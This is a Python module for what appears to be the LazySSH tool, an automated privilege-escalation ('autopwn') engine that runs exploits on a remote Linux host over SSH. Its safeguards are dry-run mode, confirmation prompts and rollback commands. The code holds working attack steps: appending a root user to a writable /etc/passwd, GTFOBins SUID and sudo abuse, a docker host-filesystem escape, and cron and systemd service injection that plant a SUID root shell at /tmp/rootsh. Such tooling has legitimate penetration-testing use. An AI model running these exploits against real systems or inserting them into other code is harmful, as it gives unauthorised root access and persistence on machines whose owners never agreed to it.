"""Autopwn exploitation engine for LazySSH enumeration.

This module provides automated exploitation of discovered vulnerabilities.
It takes enumeration findings and attempts exploitation with user confirmation
and dry-run support. All attempts are logged and rollback commands are stored
where applicable.

Safety features:
- Every exploit requires user confirmation via Rich Confirm.ask()
- Dry-run mode shows commands without executing
- All attempts recorded to ExploitAttempt records
- Rollback commands stored where applicable
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
import time
from dataclasses import dataclass, field

from lazyssh.console_instance import console

try:  # pragma: no cover - Rich may be unavailable
    from rich import box
    from rich.panel import Panel
    from rich.prompt import Confirm
    from rich.status import Status
    from rich.table import Table
except Exception:  # pragma: no cover
    Confirm = None  # type: ignore[assignment,misc]
    Panel = None  # type: ignore[assignment,misc]
    Status = None  # type: ignore[assignment,misc]
    Table = None  # type: ignore[assignment,misc]
    box = None  # type: ignore[assignment]

try:  # pragma: no cover - logging may be unavailable when packaged separately
    from lazyssh.logging_module import APP_LOGGER
except Exception:  # pragma: no cover
    APP_LOGGER = None

from lazyssh.plugins._gtfobins_data import lookup_sudo, lookup_suid
from lazyssh.plugins.enumerate import (
    EnumerationSnapshot,
    PriorityFinding,
    _get_probe,
)


@dataclass
class ExploitAttempt:
    """Record of a single exploitation attempt."""

    technique: str
    target: str
    dry_run: bool
    command: str
    success: bool
    output: str
    rollback_command: str | None = None
    duration: float = 0.0
    interactive_warning: str = ""


_INTERACTIVE_PATTERNS: list[tuple[str, str]] = [
    (r"\bpkexec\b", "pkexec requires a polkit agent / password prompt"),
    (r"\b(docker|podman)\b.*\s-[a-z]*[it][a-z]*\b", "docker -it flags require a TTY"),
    (r"\b(vim|vi|less|more|man|ed|nano)\b", "editor/pager requires terminal interaction"),
    (r"\bsu\s", "su requires password input"),
]


def _classify_interactive(command: str) -> str | None:
    """Check if a command requires interactive terminal features.

    Returns the reason string if the command is interactive, None if safe.
    """
    for pattern, reason in _INTERACTIVE_PATTERNS:
        if re.search(pattern, command):
            return reason
    return None


def _print_interactive_warning(command: str, dry_run: bool) -> str:
    """Check command for interactive patterns and print appropriate warning.

    Returns the warning reason string (empty if command is not interactive).
    """
    reason = _classify_interactive(command)
    if not reason:
        return ""
    if dry_run:
        console.print(f"  [bold yellow][INTERACTIVE][/bold yellow] {reason}")
    else:
        console.print(f"  [bold yellow]\u26a0 Interactive command:[/bold yellow] {reason}")
    return reason


@dataclass
class AutopwnResult:
    """Complete autopwn session results."""

    attempts: list[ExploitAttempt] = field(default_factory=list)

    @property
    def successes(self) -> int:
        return sum(1 for a in self.attempts if a.success)

    @property
    def failures(self) -> int:
        return sum(1 for a in self.attempts if not a.success and not a.dry_run)


def _ssh_exec(command: str, timeout: int = 30) -> tuple[int, str, str]:
    """Execute a command on the remote host via the SSH control socket.

    Returns (exit_code, stdout, stderr).
    """
    socket_path = os.environ.get("LAZYSSH_SOCKET_PATH", "")
    host = os.environ.get("LAZYSSH_HOST", "")
    user = os.environ.get("LAZYSSH_USER", "")
    port = os.environ.get("LAZYSSH_PORT")

    if not socket_path or not host or not user:
        return 1, "", "Missing SSH environment variables"

    ssh_cmd: list[str] = ["ssh", "-S", socket_path, "-o", "ControlMaster=no"]
    if port:
        ssh_cmd.extend(["-p", port])
    ssh_cmd.append(f"{user}@{host}")
    ssh_cmd.extend(["sh", "-c", shlex.quote(command)])

    try:
        result = subprocess.run(  # noqa: S603,S607
            ssh_cmd,
            text=True,
            capture_output=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return 1, "", "Command timed out"


def _confirm(prompt: str) -> bool:
    """Ask user for confirmation via Rich Confirm.ask()."""
    if Confirm is not None:
        return Confirm.ask(prompt, default=False)
    # Fallback if Rich is unavailable
    response = input(f"{prompt} [y/N]: ")  # pragma: no cover
    return response.strip().lower() in ("y", "yes")  # pragma: no cover


def _sanitize_docker_command(command: str) -> str:
    """Strip interactive flags from docker/podman commands and add --rm.

    Removes ``-it``, ``-ti``, ``--interactive``, and ``--tty`` flags that would
    hang when executed over a non-TTY SSH channel.  Adds ``--rm`` if not already
    present so containers are cleaned up automatically.

    Non-docker/podman commands are returned unchanged.
    """
    # Only touch docker/podman commands
    if not re.search(r"\b(docker|podman)\b", command):
        return command

    # Strip combined short flags containing i/t (e.g. -it, -ti, -ait, etc.)
    # We need to handle: -it, -ti, and flags like -dit where other flags are present
    def _strip_it_flags(m: re.Match[str]) -> str:
        prefix = m.group(1)  # the '-'
        flags = m.group(2)  # the flag letters
        remaining = flags.replace("i", "").replace("t", "")
        if remaining:
            return f"{prefix}{remaining}"
        return ""

    command = re.sub(r"(?<=\s)(-)((?=[a-z]*[it])[a-z]+)\b", _strip_it_flags, command)
    # Also handle if it's right after the subcommand at start-ish position
    command = re.sub(r"^(-)((?=[a-z]*[it])[a-z]+)\b", _strip_it_flags, command)

    # Strip long-form flags
    command = re.sub(r"\s+--interactive\b", "", command)
    command = re.sub(r"\s+--tty\b", "", command)

    # Add --rm if not present (insert after 'docker run' or 'podman run')
    if "--rm" not in command:
        command = re.sub(r"(\b(?:docker|podman)\s+run)\b", r"\1 --rm", command)

    # Clean up multiple spaces
    command = re.sub(r"  +", " ", command).strip()

    return command


class AutopwnEngine:
    """Orchestrates automated exploitation of discovered vulnerabilities."""

    def __init__(
        self,
        snapshot: EnumerationSnapshot,
        findings: list[PriorityFinding],
        dry_run: bool = False,
        timeout: int = 30,
    ) -> None:
        self.snapshot = snapshot
        self.findings = findings
        self.dry_run = dry_run
        self.timeout = max(5, min(120, timeout))
        self.result = AutopwnResult()

    def _exec_with_progress(self, command: str, timeout: int = 30) -> tuple[int, str, str, float]:
        """Execute a remote command with a Rich spinner and timing.

        The effective timeout is capped by the engine-level ``self.timeout``.

        Returns (exit_code, stdout, stderr, elapsed_seconds).
        """
        timeout = min(timeout, self.timeout)
        truncated = command[:60] + "..." if len(command) > 60 else command
        label = f"Executing: {truncated} (timeout: {timeout}s)"

        start = time.monotonic()
        if Status is not None:
            with Status(label, console=console, spinner="dots"):
                exit_code, stdout, stderr = _ssh_exec(command, timeout=timeout)
        else:  # pragma: no cover
            exit_code, stdout, stderr = _ssh_exec(command, timeout=timeout)
        elapsed = time.monotonic() - start

        console.print(f"  [dim]Completed in {elapsed:.1f}s[/dim]")
        return exit_code, stdout, stderr, elapsed

    def run(self) -> AutopwnResult:
        """Execute autopwn sequence. Returns results."""
        exploitable = [f for f in self.findings if f.exploitation_difficulty and f.exploit_commands]

        if not exploitable:
            console.print("[dim]No exploitable findings with known techniques.[/dim]")
            return self.result

        # Sort by difficulty: instant first, then easy, then moderate
        difficulty_order = {"instant": 0, "easy": 1, "moderate": 2}
        exploitable.sort(key=lambda f: difficulty_order.get(f.exploitation_difficulty, 3))

        # Display prominent mode banner
        if Panel is not None and box is not None:
            if self.dry_run:
                banner = Panel(
                    "NO COMMANDS WILL BE EXECUTED\n"
                    "Review the commands below. Re-run without --dry-run to execute.",
                    title="DRY-RUN MODE",
                    border_style="warning",
                    box=box.HEAVY,
                )
            else:
                banner = Panel(
                    "LIVE EXPLOITATION MODE\n"
                    "Commands will be executed on the remote host. "
                    "Each requires confirmation.",
                    title="LIVE MODE",
                    border_style="error",
                    box=box.HEAVY,
                )
            console.print()
            console.print(banner)
        else:  # pragma: no cover - Rich unavailable
            mode_label = "DRY-RUN" if self.dry_run else "LIVE"
            console.print(f"\n=== Autopwn Engine — {mode_label} ===")

        # For live mode, require explicit confirmation before proceeding
        if not self.dry_run:
            if not _confirm("Proceed with live exploitation?"):
                console.print("[dim]Aborted by user.[/dim]")
                return self.result

        console.print(f"Found {len(exploitable)} exploitable findings to attempt.\n")

        for finding in exploitable:
            self._try_finding(finding)

        self._render_summary()
        return self.result

    def _try_finding(self, finding: PriorityFinding) -> None:
        """Route a finding to the appropriate exploit method."""
        key = finding.key

        if key == "writable_passwd_file":
            attempt = self._exploit_writable_passwd(finding)
            if attempt:
                self.result.attempts.append(attempt)
        elif key == "gtfobins_suid":
            attempts = self._exploit_gtfobins_suid(finding)
            self.result.attempts.extend(attempts)
        elif key == "gtfobins_sudo":
            attempts = self._exploit_gtfobins_sudo(finding)
            self.result.attempts.extend(attempts)
        elif key == "docker_escape":
            attempt = self._exploit_docker_escape(finding)
            if attempt:
                self.result.attempts.append(attempt)
        elif key == "writable_cron_files":
            attempts = self._exploit_writable_cron(finding)
            self.result.attempts.extend(attempts)
        elif key == "writable_service_files":
            attempts = self._exploit_writable_service(finding)
            self.result.attempts.extend(attempts)
        else:
            # For findings that have exploit commands but no specific handler,
            # display the commands in dry-run style
            if finding.exploit_commands:  # pragma: no branch - filtered by run()
                self._generic_exploit_display(finding)

    def _exploit_writable_passwd(self, finding: PriorityFinding) -> ExploitAttempt | None:
        """Exploit writable /etc/passwd by appending a root-level user."""
        technique = "writable_passwd"
        target = "/etc/passwd"

        # The commands from the finding (guaranteed non-empty by run() filter)
        commands = finding.exploit_commands
        if not commands:  # pragma: no cover - filtered by run()
            return None  # pragma: no cover

        # Use the first real command (skip comments)
        append_cmd = ""
        verify_cmd = "su hacker"
        for cmd in commands:
            if not cmd.startswith("#"):
                append_cmd = cmd
                break
        if not append_cmd:
            return None

        console.print(
            f"[bold red]>>> Exploit: Writable /etc/passwd[/bold red] "
            f"(difficulty: {finding.exploitation_difficulty})"
        )
        console.print(f"  Command: [dim]{append_cmd}[/dim]")
        warning = _print_interactive_warning(append_cmd, self.dry_run)

        if self.dry_run:
            console.print("  [yellow]DRY-RUN: Command not executed[/yellow]\n")
            return ExploitAttempt(
                technique=technique,
                target=target,
                dry_run=True,
                command=append_cmd,
                success=True,
                output="Dry-run — command would append root user to /etc/passwd",
                rollback_command="sed -i '/^hacker:/d' /etc/passwd",
                interactive_warning=warning,
            )

        if not _confirm("  Append root user to /etc/passwd?"):
            console.print("  [dim]Skipped by user.[/dim]\n")
            return None

        exit_code, stdout, stderr, elapsed = self._exec_with_progress(append_cmd)
        success = exit_code == 0
        output = stdout or stderr

        if success:
            console.print("  [success]Exploit succeeded![/success]")
            console.print(f"  [dim]Switch user: {verify_cmd}[/dim]\n")
        else:
            console.print(f"  [error]Exploit failed: {output}[/error]\n")

        return ExploitAttempt(
            technique=technique,
            target=target,
            dry_run=False,
            command=append_cmd,
            success=success,
            output=output,
            rollback_command="sed -i '/^hacker:/d' /etc/passwd",
            duration=elapsed,
            interactive_warning=warning,
        )

    def _exploit_gtfobins_suid(self, finding: PriorityFinding) -> list[ExploitAttempt]:
        """Exploit SUID binaries using GTFOBins techniques."""
        attempts: list[ExploitAttempt] = []

        # Get the SUID binary paths from evidence
        suid_probe = _get_probe(self.snapshot, "filesystem", "suid_files")
        if not suid_probe or not suid_probe.stdout:
            return attempts

        for line in suid_probe.stdout.splitlines():
            path = line.strip()
            if not path:
                continue
            binary_name = path.rsplit("/", 1)[-1] if "/" in path else path
            entries = lookup_suid(binary_name)
            if not entries:
                continue

            # Use the first matching entry
            entry = entries[0]
            cmd = entry.command_template

            console.print(
                f"[bold red]>>> Exploit: SUID {binary_name}[/bold red] "
                f"({path}) — {entry.description}"
            )
            console.print(f"  Command: [dim]{cmd}[/dim]")
            warning = _print_interactive_warning(cmd, self.dry_run)

            if self.dry_run:
                console.print("  [yellow]DRY-RUN: Command not executed[/yellow]\n")
                attempts.append(
                    ExploitAttempt(
                        technique="gtfobins_suid",
                        target=path,
                        dry_run=True,
                        command=cmd,
                        success=True,
                        output=f"Dry-run — would execute: {cmd}",
                        interactive_warning=warning,
                    )
                )
                continue

            if not _confirm(f"  Execute SUID exploit for {binary_name}?"):
                console.print("  [dim]Skipped by user.[/dim]\n")
                continue

            exit_code, stdout, stderr, elapsed = self._exec_with_progress(cmd)
            success = exit_code == 0
            output = stdout or stderr

            if success:
                console.print("  [success]Exploit succeeded![/success]\n")
            else:
                console.print(f"  [error]Exploit failed: {output}[/error]\n")

            attempts.append(
                ExploitAttempt(
                    technique="gtfobins_suid",
                    target=path,
                    dry_run=False,
                    command=cmd,
                    success=success,
                    output=output,
                    duration=elapsed,
                    interactive_warning=warning,
                )
            )

            # Stop after first successful SUID exploit (we have a shell)
            if success:
                break

        return attempts

    def _exploit_gtfobins_sudo(self, finding: PriorityFinding) -> list[ExploitAttempt]:
        """Exploit sudo-allowed binaries using GTFOBins techniques."""
        attempts: list[ExploitAttempt] = []

        sudo_probe = _get_probe(self.snapshot, "users", "sudo_check")
        if not sudo_probe or not sudo_probe.stdout:
            return attempts

        for line in sudo_probe.stdout.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("User ") or stripped.startswith("Matching"):
                continue

            # Extract binary path
            binary_path = ""
            parts = stripped.split()
            for part in parts:
                if part.startswith("/"):
                    binary_path = part
                    break
            if not binary_path:
                binary_path = parts[-1] if parts else ""
            binary_name = binary_path.rsplit("/", 1)[-1] if "/" in binary_path else binary_path
            entries = lookup_sudo(binary_name)
            if not entries:
                continue

            entry = entries[0]
            cmd = entry.command_template

            console.print(
                f"[bold red]>>> Exploit: Sudo {binary_name}[/bold red] — {entry.description}"
            )
            console.print(f"  Command: [dim]{cmd}[/dim]")
            warning = _print_interactive_warning(cmd, self.dry_run)

            if self.dry_run:
                console.print("  [yellow]DRY-RUN: Command not executed[/yellow]\n")
                attempts.append(
                    ExploitAttempt(
                        technique="gtfobins_sudo",
                        target=binary_path,
                        dry_run=True,
                        command=cmd,
                        success=True,
                        output=f"Dry-run — would execute: {cmd}",
                        interactive_warning=warning,
                    )
                )
                continue

            if not _confirm(f"  Execute sudo exploit for {binary_name}?"):
                console.print("  [dim]Skipped by user.[/dim]\n")
                continue

            exit_code, stdout, stderr, elapsed = self._exec_with_progress(cmd)
            success = exit_code == 0
            output = stdout or stderr

            if success:
                console.print("  [success]Exploit succeeded![/success]\n")
            else:
                console.print(f"  [error]Exploit failed: {output}[/error]\n")

            attempts.append(
                ExploitAttempt(
                    technique="gtfobins_sudo",
                    target=binary_path,
                    dry_run=False,
                    command=cmd,
                    success=success,
                    output=output,
                    duration=elapsed,
                    interactive_warning=warning,
                )
            )

            if success:
                break

        return attempts

    def _exploit_docker_escape(self, finding: PriorityFinding) -> ExploitAttempt | None:
        """Exploit docker group membership or socket access for host escape."""
        technique = "docker_escape"
        cmd = "docker run --rm -v /:/hostfs alpine chroot /hostfs /bin/bash"

        if finding.exploit_commands:  # pragma: no branch - filtered by run()
            cmd = _sanitize_docker_command(finding.exploit_commands[0])

        console.print(
            f"[bold red]>>> Exploit: Docker Escape[/bold red] "
            f"(difficulty: {finding.exploitation_difficulty})"
        )
        console.print(f"  Command: [dim]{cmd}[/dim]")
        warning = _print_interactive_warning(cmd, self.dry_run)

        if self.dry_run:
            console.print("  [yellow]DRY-RUN: Command not executed[/yellow]\n")
            return ExploitAttempt(
                technique=technique,
                target="docker",
                dry_run=True,
                command=cmd,
                success=True,
                output="Dry-run — would mount host filesystem via docker",
                interactive_warning=warning,
            )

        if not _confirm("  Mount host filesystem via docker?"):
            console.print("  [dim]Skipped by user.[/dim]\n")
            return None

        exit_code, stdout, stderr, elapsed = self._exec_with_progress(cmd, timeout=60)
        success = exit_code == 0
        output = stdout or stderr

        if success:
            console.print("  [success]Docker escape succeeded![/success]\n")
        else:
            console.print(f"  [error]Docker escape failed: {output}[/error]\n")

        return ExploitAttempt(
            technique=technique,
            target="docker",
            dry_run=False,
            command=cmd,
            success=success,
            output=output,
            duration=elapsed,
            interactive_warning=warning,
        )

    def _exploit_writable_cron(self, finding: PriorityFinding) -> list[ExploitAttempt]:
        """Exploit writable cron files by injecting a reverse shell or command."""
        attempts: list[ExploitAttempt] = []

        cron_probe = _get_probe(self.snapshot, "writable", "writable_cron")
        if not cron_probe or not cron_probe.stdout:
            return attempts

        writable_files = [
            line.replace("WRITABLE:", "").strip()
            for line in cron_probe.stdout.splitlines()
            if line.strip().startswith("WRITABLE:")
        ]
        if not writable_files:
            return attempts

        for cron_path in writable_files[:3]:
            # Inject a cron entry that copies /bin/sh as SUID
            payload = "* * * * * root cp /bin/sh /tmp/rootsh && chmod u+s /tmp/rootsh"
            cmd = f"echo '{payload}' >> {shlex.quote(cron_path)}"
            rollback = f"sed -i '/rootsh/d' {shlex.quote(cron_path)}"

            console.print(f"[bold red]>>> Exploit: Writable Cron[/bold red] — {cron_path}")
            console.print(f"  Payload: [dim]{payload}[/dim]")
            warning = _print_interactive_warning(cmd, self.dry_run)

            if self.dry_run:
                console.print("  [yellow]DRY-RUN: Command not executed[/yellow]\n")
                attempts.append(
                    ExploitAttempt(
                        technique="writable_cron",
                        target=cron_path,
                        dry_run=True,
                        command=cmd,
                        success=True,
                        output=f"Dry-run — would inject cron payload into {cron_path}",
                        rollback_command=rollback,
                        interactive_warning=warning,
                    )
                )
                continue

            if not _confirm(f"  Inject cron payload into {cron_path}?"):
                console.print("  [dim]Skipped by user.[/dim]\n")
                continue

            exit_code, stdout, stderr, elapsed = self._exec_with_progress(cmd)
            success = exit_code == 0
            output = stdout or stderr

            if success:
                console.print(
                    "  [success]Cron payload injected![/success] "
                    "Wait ~60s for SUID shell at /tmp/rootsh"
                )
                console.print(f"  [dim]Rollback: {rollback}[/dim]\n")
            else:
                console.print(f"  [error]Injection failed: {output}[/error]\n")

            attempts.append(
                ExploitAttempt(
                    technique="writable_cron",
                    target=cron_path,
                    dry_run=False,
                    command=cmd,
                    success=success,
                    output=output,
                    rollback_command=rollback,
                    duration=elapsed,
                    interactive_warning=warning,
                )
            )

            if success:
                break

        return attempts

    def _exploit_writable_service(self, finding: PriorityFinding) -> list[ExploitAttempt]:
        """Exploit writable systemd service files."""
        attempts: list[ExploitAttempt] = []

        svc_probe = _get_probe(self.snapshot, "writable", "writable_services")
        if not svc_probe or not svc_probe.stdout:
            return attempts

        writable_services = [
            line.strip()
            for line in svc_probe.stdout.splitlines()
            if line.strip() and "NONE_WRITABLE" not in line
        ]
        if not writable_services:
            return attempts

        for svc_path in writable_services[:2]:
            svc_name = svc_path.rsplit("/", 1)[-1] if "/" in svc_path else svc_path
            # Inject ExecStart to create SUID shell
            payload = "cp /bin/sh /tmp/rootsh && chmod u+s /tmp/rootsh"
            cmd = (
                f"sed -i 's|^ExecStart=.*|ExecStart=/bin/sh -c \"{payload}\"|' "
                f"{shlex.quote(svc_path)} && systemctl daemon-reload && "
                f"systemctl restart {shlex.quote(svc_name)}"
            )

            console.print(f"[bold red]>>> Exploit: Writable Service[/bold red] — {svc_path}")
            console.print("  Will modify ExecStart and restart service")
            console.print(f"  Command: [dim]{cmd}[/dim]")
            warning = _print_interactive_warning(cmd, self.dry_run)

            if self.dry_run:
                console.print("  [yellow]DRY-RUN: Command not executed[/yellow]\n")
                attempts.append(
                    ExploitAttempt(
                        technique="writable_service",
                        target=svc_path,
                        dry_run=True,
                        command=cmd,
                        success=True,
                        output=f"Dry-run — would modify {svc_path} and restart service",
                        interactive_warning=warning,
                    )
                )
                continue

            if not _confirm(f"  Modify service file {svc_path} and restart?"):
                console.print("  [dim]Skipped by user.[/dim]\n")
                continue

            exit_code, stdout, stderr, elapsed = self._exec_with_progress(cmd, timeout=30)
            success = exit_code == 0
            output = stdout or stderr

            if success:
                console.print(
                    "  [success]Service exploited![/success] Check /tmp/rootsh for SUID shell"
                )
            else:
                console.print(f"  [error]Service exploit failed: {output}[/error]\n")

            attempts.append(
                ExploitAttempt(
                    technique="writable_service",
                    target=svc_path,
                    dry_run=False,
                    command=cmd,
                    success=success,
                    output=output,
                    duration=elapsed,
                    interactive_warning=warning,
                )
            )

            if success:
                break

        return attempts

    def _generic_exploit_display(self, finding: PriorityFinding) -> None:
        """Display exploit commands for findings without a specific handler."""
        console.print(
            f"[bold yellow]>>> Info: {finding.headline}[/bold yellow] "
            f"(difficulty: {finding.exploitation_difficulty})"
        )
        for cmd in finding.exploit_commands[:5]:
            if cmd.startswith("#"):
                console.print(f"  [dim]{cmd}[/dim]")
            else:
                console.print(f"  [accent]{cmd}[/accent]")
        console.print()

    def _render_summary(self) -> None:
        """Render a summary of all autopwn attempts as a Rich table."""
        if not self.result.attempts:
            console.print("[dim]No exploitation attempts were made.[/dim]")
            return

        if Table is not None and Panel is not None and box is not None:
            self._render_summary_rich()
        else:  # pragma: no cover - Rich unavailable
            self._render_summary_plain()

    def _render_summary_rich(self) -> None:
        """Render summary using Rich tables."""
        summary_table = Table(
            box=box.ROUNDED,
            title_style="panel.title",
            show_lines=True,
        )
        summary_table.add_column("#", style="dim", width=3, justify="right")
        summary_table.add_column("Technique", style="accent")
        summary_table.add_column("Target")
        summary_table.add_column("Command", max_width=50)
        summary_table.add_column("Status", justify="center")
        summary_table.add_column("Duration", justify="right", style="dim")

        for idx, attempt in enumerate(self.result.attempts, 1):
            # Truncate command for display
            cmd_display = attempt.command
            if len(cmd_display) > 50:
                cmd_display = cmd_display[:47] + "..."

            # Status badge
            if attempt.dry_run:
                status = "[bold yellow]DRY-RUN[/bold yellow]"
            elif attempt.success:
                status = "[bold green]SUCCESS[/bold green]"
            else:
                status = "[bold red]FAILED[/bold red]"

            # Duration
            duration = f"{attempt.duration:.1f}s" if attempt.duration > 0 else "-"

            summary_table.add_row(
                str(idx),
                attempt.technique,
                attempt.target,
                cmd_display,
                status,
                duration,
            )

        summary_panel = Panel(
            summary_table,
            title="Autopwn Summary",
            subtitle=(
                f"{len(self.result.attempts)} attempts | "
                f"{self.result.successes} succeeded | "
                f"{self.result.failures} failed"
            ),
            border_style="panel.title",
            box=box.ROUNDED,
        )
        console.print()
        console.print(summary_panel)

        # Rollback sub-table
        rollbacks = [a for a in self.result.attempts if a.rollback_command and a.success]
        if rollbacks:
            rb_table = Table(box=box.SIMPLE, show_header=True)
            rb_table.add_column("Technique", style="accent")
            rb_table.add_column("Rollback Command", style="highlight")
            for attempt in rollbacks:
                rb_table.add_row(attempt.technique, attempt.rollback_command)

            rb_panel = Panel(
                rb_table,
                title="Rollback Commands",
                border_style="warning",
                box=box.ROUNDED,
            )
            console.print(rb_panel)

        console.print()

    def _render_summary_plain(self) -> None:  # pragma: no cover - Rich unavailable
        """Render summary as plain text."""
        console.print("\n=== Autopwn Summary ===")
        console.print(
            f"  Attempts: {len(self.result.attempts)} | "
            f"Successes: {self.result.successes} | "
            f"Failures: {self.result.failures}"
        )
        for idx, attempt in enumerate(self.result.attempts, 1):
            if attempt.dry_run:
                status = "DRY-RUN"
            elif attempt.success:
                status = "SUCCESS"
            else:
                status = "FAILED"
            console.print(f"  {idx}. [{status}] {attempt.technique} -> {attempt.target}")

        rollbacks = [a for a in self.result.attempts if a.rollback_command and a.success]
        if rollbacks:
            console.print("\n  Rollback commands:")
            for attempt in rollbacks:
                console.print(f"    [{attempt.technique}] {attempt.rollback_command}")
        console.print()
